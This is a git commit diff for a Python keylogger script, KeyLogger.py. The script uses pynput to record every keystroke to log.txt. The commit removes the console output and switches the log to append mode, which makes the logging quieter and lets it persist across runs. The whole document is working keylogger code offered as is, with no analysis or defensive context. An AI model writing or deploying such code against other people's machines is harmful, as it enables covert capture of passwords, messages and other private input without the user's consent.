6c92306717841ab26a17c2bc7a6ccd4e087bee77
Nakshatra gandhe <nakshuwork2@gmail.com>
2024-08-07 10:02:39 +0530

    KeyLogger.py

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,38 +1,36 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-keys  = []
-def KEY_press(key):
+keys = []
+
+
+def key_press(key):
     keys.append(key)
-    file_write(keys)
-    try :
-        print('alphanumeric key {0} pressed'.format(key.char))
-    except AttributeError:
-        print('special key {0} pressed '.format(key))
+    file_write(key)
 
 
-def file_write(keys):
+def file_write(key):
     special_characters = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '{', '}', '[', ']', ':',
                           ';', '"', "'", '<', '>', ',', '.', '?', '/']
 
-    with open('log.txt', 'w') as file:
-        for key in keys:
-            k = str(key).replace("'", "")
-            file.write(k)
-            if key == 'Key.space' or key == 'Key.shift':
+    with open('log.txt', 'a') as file:  # Append mode to keep adding to the file
+        if isinstance(key, Key):
+            if key == Key.space:
                 file.write(' ')
-            elif k in special_characters:
-                file.write(k + '\n')
+            else:
+                file.write(f'[{key}]')
+        else:
+            k = str(key).replace("'", "")
+            if k in special_characters:
+                file.write(f'({k})')
             else:
                 file.write(k)
 
 
 def on_release(key):
-    print('{0} released'.format(key))
     if key == Key.esc:
-        return False
-        #stop the listerner
-with Listener(on_press= KEY_press,
-              on_release=on_release) as listener:
-    listener.join()
+        return False  # Stop the listener
 
+
+with Listener(on_press=key_press, on_release=on_release) as listener:
+    listener.join()
